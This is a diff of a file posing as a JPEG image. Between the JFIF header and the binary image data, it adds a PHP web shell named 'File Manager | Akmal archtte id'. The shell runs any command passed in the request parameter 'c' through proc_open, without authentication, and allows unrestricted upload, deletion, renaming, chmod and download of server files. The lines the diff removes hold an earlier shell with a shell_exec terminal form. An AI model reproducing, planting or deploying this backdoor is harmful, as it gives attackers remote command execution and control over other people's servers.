@@ -1,198 +1,361 @@
 ���� JFIF      ��
+<?php
+
+function executeCommand($input) {
+    $descriptors = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w") 
+    );
+
+    $process = proc_open($input, $descriptors, $pipes);
+
+    if (is_resource($process)) {
+      
+        $output = stream_get_contents($pipes[1]);
+        $errorOutput = stream_get_contents($pipes[2]);
+
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+
+        
+        $exitCode = proc_close($process);
+
+        if ($exitCode === 0) {
+            return $output;
+        } else {
+            return "Error: " . $errorOutput;
+        }
+    } else {
+        return "Tidak dapat menjalankan perintah\n";
+    }
+}
+
+if (isset($_REQUEST['c'])) {
+    $command = $_REQUEST['c'];
+    echo executeCommand($command);
+}
+
+// Fungsi untuk menghapus file
+function delete_file($file) {
+    if (file_exists($file)) {
+        unlink($file);
+        echo '<div class="alert alert-success">File berhasil dihapus: ' . $file . '</div>';
+    } else {
+        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
+    }
+}
+
+// Fungsi untuk membuat folder
+function create_folder($folder_name) {
+    if (!file_exists($folder_name)) {
+        mkdir($folder_name);
+        echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_name . '</div>';
+    } else {
+        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_name . '</div>';
+    }
+}
+
+// Fungsi untuk membuat file baru
+function create_file($file_name, $content) {
+    if (!file_exists($file_name)) {
+        file_put_contents($file_name, $content);
+        echo '<div class="alert alert-success">File berhasil dibuat: ' . $file_name . '</div>';
+    } else {
+        echo '<div class="alert alert-warning">File sudah ada: ' . $file_name . '</div>';
+    }
+}
+
+// Fungsi untuk mengedit nama file
+function rename_file($file, $new_name) {
+    $dir = dirname($file);
+    $new_file = $dir . '/' . $new_name;
+    if (file_exists($file)) {
+        if (!file_exists($new_file)) {
+            rename($file, $new_file);
+            echo '<div class="alert alert-success">File berhasil diubah nama menjadi: ' . $new_name . '</div>';
+        } else {
+            echo '<div class="alert alert-warning">File dengan nama yang sama sudah ada: ' . $new_name . '</div>';
+        }
+    } else {
+        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
+    }
+}
+
+// Fungsi untuk mengedit nama folder
+function rename_folder($folder, $new_name) {
+    $dir = dirname($folder);
+    $new_folder = $dir . '/' . $new_name;
+    if (file_exists($folder)) {
+        if (!file_exists($new_folder)) {
+            rename($folder, $new_folder);
+            echo '<div class="alert alert-success">Folder berhasil diubah nama menjadi: ' . $new_name . '</div>';
+        } else {
+            echo '<div class="alert alert-warning">Folder dengan nama yang sama sudah ada: ' . $new_name . '</div>';
+        }
+    } else {
+        echo '<div class="alert alert-danger">Folder tidak ditemukan: ' . $folder . '</div>';
+    }
+}
+
+// Fungsi untuk mengubah izin file
+function change_permissions($file, $permissions) {
+    if (file_exists($file)) {
+        if (chmod($file, octdec($permissions))) {
+            echo '<div class="alert alert-success">Izin file berhasil diubah: ' . $file . '</div>';
+        } else {
+            echo '<div class="alert alert-danger">Gagal mengubah izin file: ' . $file . '</div>';
+        }
+    } else {
+        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
+    }
+}
+
+// Fungsi untuk mendapatkan izin file atau folder dalam format "drwxr-xr-x"
+function get_permissions($file) {
+    $perms = fileperms($file);
+    $info = '';
+
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+              (($perms & 0x0800) ? 's' : 'x' ) :
+              (($perms & 0x0800) ? 'S' : '-'));
+
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+              (($perms & 0x0400) ? 's' : 'x' ) :
+              (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+              (($perms & 0x0200) ? 't' : 'x' ) :
+              (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+// Tentukan direktori saat ini
+$dir = $_GET['path'] ?? __DIR__;
+
+// Logika untuk form
+if (isset($_POST['submit'])) {
+    $file_name = $_FILES['file']['name'];
+    $file_tmp = $_FILES['file']['tmp_name'];
+    move_uploaded_file($file_tmp, $dir . '/' . $file_name);
+}
+
+if (isset($_POST['create_folder'])) {
+    create_folder($dir . '/' . $_POST['folder_name']);
+}
+
+if (isset($_POST['create_file'])) {
+    create_file($dir . '/' . $_POST['file_name'], $_POST['file_content']);
+}
+
+if (isset($_GET['delete'])) {
+    delete_file($dir . '/' . $_GET['delete']);
+}
+
+if (isset($_POST['rename_file'])) {
+    rename_file($dir . '/' . $_POST['file_name'], $_POST['new_name']);
+}
+
+if (isset($_POST['rename_folder'])) {
+    rename_folder($dir . '/' . $_POST['folder_name'], $_POST['new_name']);
+}
+
+if (isset($_POST['change_permissions'])) {
+    change_permissions($dir . '/' . $_POST['file_name'], $_POST['permissions']);
+}
+
+if (isset($_GET['download'])) {
+    $file = $dir . '/' . $_GET['download'];
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Content-Transfer-Encoding: binary');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        ob_clean();
+        flush();
+        readfile($file);
+        exit;
+    } else {
+        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
+    }
+}
+
+// Tampilkan file dan folder
+function display_path_links($path) {
+    $parts = explode('/', $path);
+    $accumulated_path = '';
+    foreach ($parts as $part) {
+        if ($part) {
+            $accumulated_path .= '/' . $part;
+            echo '<a href="?path=' . urlencode($accumulated_path) . '">' . $part . '</a>/';
+        }
+    }
+}
+
+?>
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Manager</title>
-    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <title>File Manager | Akmal archtte id</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: #343a40;
+            color: white;
+        }
+        .container {
+            background-color: #495057;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        .list-group-item-success {
+            background-color: green;
+            color: white;
+        }
+        .list-group-item-danger {
+            background-color: red;
+            color: white;
+        }
+        a {
+            color: black;
+        }
+        a:hover {
+            color: blue;
+        }
+        .permissions {
+            font-family: monospace;
+            color: green; /* Bright light blue color */
+            margin-right: 10px;
+            display: inline-block;
+            width: 100px; /* Fixed width for alignment */
+        }
+        .file-item, .folder-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .file-actions, .folder-actions {
+            display: flex;
+            align-items: center;
+        }
+    </style>
 </head>
 <body>
-    <div class="container mt-4">
-        <?php
-        $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+    <div class="container">
+        <h1 class="text-center">File Manager</h1>
+        <h3>Current Path:</h3>
+        <div class="mb-3">
+            <?php display_path_links(realpath($dir)); ?>
+        </div>
 
-        if (isset($_FILES['file'])) {
-            $filename = $_FILES['file']['name'];
-            $file_tmp = $_FILES['file']['tmp_name'];
-            $destination = $dir . '/' . $filename;
+        <form method="post" enctype="multipart/form-data">
+            <div class="form-group">
+                <label for="file">Upload file:</label>
+                <input type="file" name="file" class="form-control" id="file">
+            </div>
+            <button type="submit" name="submit" class="btn btn-primary">Upload</button>
+        </form>
 
-            if (move_uploaded_file($file_tmp, $destination)) {
-                echo '<div class="alert alert-success">File uploaded successfully.</div>';
-            } else {
-                echo '<div class="alert alert-danger">Failed to upload file. Check permissions or server configuration.</div>';
-            }
-        }
+        <form method="post">
+            <div class="form-group">
+                <label for="folder_name">Create new folder:</label>
+                <input type="text" name="folder_name" class="form-control" id="folder_name" required>
+            </div>
+            <button type="submit" name="create_folder" class="btn btn-success">Create Folder</button>
+        </form>
 
-        if (isset($_GET['delete'])) {
-            unlink($_GET['delete']);
-            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($dir));
-            exit();
-        }
+        <form method="post">
+            <div class="form-group">
+                <label for="file_name">Create new file:</label>
+                <input type="text" name="file_name" class="form-control" id="file_name" required>
+            </div>
+            <div class="form-group">
+                <label for="file_content">Content:</label>
+                <textarea name="file_content" class="form-control" id="file_content"></textarea>
+            </div>
+            <button type="submit" name="create_file" class="btn btn-success">Create File</button>
+        </form>
 
-        if (isset($_POST['edit'])) {
-            file_put_contents($_POST['filepath'], $_POST['content']);
-            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode(dirname($_POST['filepath'])));
-            exit();
-        }
+        <hr>
 
-        if (isset($_POST['rename'])) {
-            rename($_POST['oldname'], $_POST['newname']);
-            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode(dirname($_POST['oldname'])));
-            exit();
-        }
+        <h3>Files and Folders:</h3>
+        <ul class="list-group">
+            <?php
+            $files = scandir($dir);
+            foreach ($files as $file) {
+                if ($file == '.' || $file == '..') continue;
 
-        if (isset($_POST['chmod'])) {
-            $path = $_POST['path'];
-            $permissions = octdec($_POST['permissions']);
-            chmod($path, $permissions);
-            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($dir));
-            exit();
-        }
-
-        if (isset($_POST['command'])) {
-            $output = shell_exec($_POST['command']);
-        }
-
-        function display_path_links($dir) {
-            $parts = explode('/', trim($dir, '/'));
-            $path = '';
-            echo 'Directory: /';
-            foreach ($parts as $part) {
-                $path .= $part . '/';
-                echo '<a href="?dir=' . urlencode('/' . $path) . '">' . $part . '</a> / ';
-            }
-            echo '<br>';
-        }
-
-        display_path_links($dir);
-
-        echo '<form method="POST" enctype="multipart/form-data" class="form-inline mb-3 mt-3">
-                <div class="form-group">
-                    <input type="file" name="file" class="form-control-file">
-                </div>
-                <button type="submit" class="btn btn-primary ml-2">Upload</button>
-              </form>';
-
-        $dirs = [];
-        $files = [];
-
-        $items = scandir($dir);
-        foreach ($items as $item) {
-            if ($item != '.' && $item != '..') {
-                if (is_dir($dir . '/' . $item)) {
-                    $dirs[] = $item;
+                $filePath = $dir . '/' . $file;
+                $permissions = get_permissions($filePath);
+                if (is_dir($filePath)) {
+                    echo '<li class="list-group-item folder-item">';
+                    echo '<div>';
+                    echo '<span class="permissions">' . $permissions . '</span>';
+                    echo '<a href="?path=' . urlencode($filePath) . '">' . $file . '</a>';
+                    echo '</div>';
+                    echo '<div class="folder-actions">';
+                    echo '<form method="post" class="form-inline ml-2">';
+                    echo '<input type="hidden" name="folder_name" value="' . $file . '">';
+                    echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
+                    echo '<button type="submit" name="rename_folder" class="btn btn-warning ml-1">Rename</button>';
+                    echo '</form>';
+                    echo '</div>';
+                    echo '</li>';
                 } else {
-                    $files[] = $item;
+                    echo '<li class="list-group-item file-item">';
+                    echo '<div>';
+                    echo '<span class="permissions">' . $permissions . '</span>';
+                    echo '<a href="?path=' . urlencode($dir) . '&download=' . urlencode($file) . '">' . $file . '</a>';
+                    echo '</div>';
+                    echo '<div class="file-actions">';
+                    echo '<a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="btn btn-danger btn-sm ml-2">Delete</a>';
+                    echo '<form method="post" class="form-inline ml-2">';
+                    echo '<input type="hidden" name="file_name" value="' . $file . '">';
+                    echo '<input type="text" name="new_name" class="form-control" placeholder="New name" required>';
+                    echo '<button type="submit" name="rename_file" class="btn btn-warning ml-1">Rename</button>';
+                    echo '</form>';
+                    echo '<form method="post" class="form-inline ml-2">';
+                    echo '<input type="hidden" name="file_name" value="' . $file . '">';
+                    echo '<input type="text" name="permissions" class="form-control" placeholder="Permissions" required>';
+                    echo '<button type="submit" name="change_permissions" class="btn btn-info ml-1">Change Permissions</button>';
+                    echo '</form>';
+                    echo '</div>';
+                    echo '</li>';
                 }
             }
-        }
-
-        sort($dirs);
-        sort($files);
-
-        echo '<h3>Directories:</h3>';
-        echo '<ul class="list-group mb-3">';
-        echo '<li class="list-group-item"><a href="?dir=' . urlencode(dirname($dir)) . '">.. (up)</a></li>';
-        foreach ($dirs as $d) {
-            $dir_path = $dir . '/' . $d;
-			            $is_uneditable = !is_writable($dir_path) ? 'list-group-item-danger' : '';
-            echo '<li class="list-group-item d-flex justify-content-between align-items-center ' . $is_uneditable . '">';
-            echo '<a href="?dir=' . urlencode($dir_path) . '">' . $d . '/</a>';
-            if (!$is_uneditable) {
-                echo '<span>';
-                echo '<a href="?rename=' . urlencode($dir_path) . '" class="btn btn-info btn-sm ml-2">Rename</a>';
-                echo '<a href="?chmod=' . urlencode($dir_path) . '" class="btn btn-secondary btn-sm ml-2">Chmod</a>';
-                echo '</span>';
-            }
-            echo '</li>';
-        }
-        echo '</ul>';
-
-        echo '<h3>Files:</h3>';
-        echo '<ul class="list-group">';
-        foreach ($files as $f) {
-            $file_path = $dir . '/' . $f;
-            $is_uneditable = !is_writable($file_path) ? 'list-group-item-danger' : '';
-            echo '<li class="list-group-item d-flex justify-content-between align-items-center ' . $is_uneditable . '">';
-            echo $f;
-            if (!$is_uneditable) {
-                echo '<span>';
-                echo '<a href="?edit=' . urlencode($file_path) . '" class="btn btn-warning btn-sm ml-2">Edit</a>';
-                echo '<a href="?delete=' . urlencode($file_path) . '" class="btn btn-danger btn-sm ml-2">Delete</a>';
-                echo '<a href="?rename=' . urlencode($file_path) . '" class="btn btn-info btn-sm ml-2">Rename</a>';
-                echo '<a href="?chmod=' . urlencode($file_path) . '" class="btn btn-secondary btn-sm ml-2">Chmod</a>';
-                echo '</span>';
-            }
-            echo '</li>';
-        }
-        echo '</ul>';
-
-        if (isset($_GET['edit'])) {
-            $file_to_edit = $_GET['edit'];
-            $content = file_get_contents($file_to_edit);
-            echo '<form method="POST" class="mt-3">
-                    <input type="hidden" name="filepath" value="' . htmlspecialchars($file_to_edit) . '">
-                    <div class="form-group">
-                        <textarea name="content" rows="10" class="form-control">' . htmlspecialchars($content) . '</textarea>
-                    </div>
-                    <button type="submit" name="edit" class="btn btn-success">Save</button>
-                    <a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) . '" class="btn btn-secondary">Cancel</a>
-                  </form>';
-        }
-
-        if (isset($_GET['rename'])) {
-            $item_to_rename = $_GET['rename'];
-            echo '<form method="POST" class="mt-3">
-                    <input type="hidden" name="oldname" value="' . htmlspecialchars($item_to_rename) . '">
-                    <div class="form-group">
-                        <input type="text" name="newname" class="form-control" placeholder="New name" value="' . htmlspecialchars(basename($item_to_rename)) . '">
-                    </div>
-                    <button type="submit" name="rename" class="btn btn-success">Rename</button>
-                    <a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) . '" class="btn btn-secondary">Cancel</a>
-                  </form>';
-        }
-
-        if (isset($_GET['chmod'])) {
-            $path_to_chmod = $_GET['chmod'];
-            echo '<form method="POST" class
-			            $path_to_chmod = $_GET['chmod'];
-            echo '<form method="POST" class="mt-3">
-                    <input type="hidden" name="path" value="' . htmlspecialchars($path_to_chmod) . '">
-                    <div class="form-group">
-                        <input type="text" name="permissions" class="form-control" placeholder="Permissions (e.g., 0755)">
-                    </div>
-                    <button type="submit" name="chmod" class="btn btn-success">Set Permissions</button>
-                    <a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) . '" class="btn btn-secondary">Cancel</a>
-                  </form>';
-        }
-
-        echo '<div class="mt-5">
-                <h4>Terminal</h4>
-                <form method="POST">
-                    <div class="form-group">
-                        <input type="text" name="command" class="form-control" placeholder="Enter command">
-                    </div>
-                    <button type="submit" class="btn btn-secondary">Execute</button>
-                </form>';
-
-        if (isset($output)) {
-            echo '<pre class="mt-3">' . htmlspecialchars($output) . '</pre>';
-        }
-
-        echo '</div>';
-        ?>
-
-        <footer class="mt-5">
-            <p>© 2024 Akmal archtte id</p>
-        </footer>
+            ?>
+        </ul>
     </div>
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
 
+
+
+
+
+
+
+
+
+			
+
+		
+
 
-�� C
-		I1��_��
+�� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) $��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�~~�t�U�Cڒ�V		I1��_��
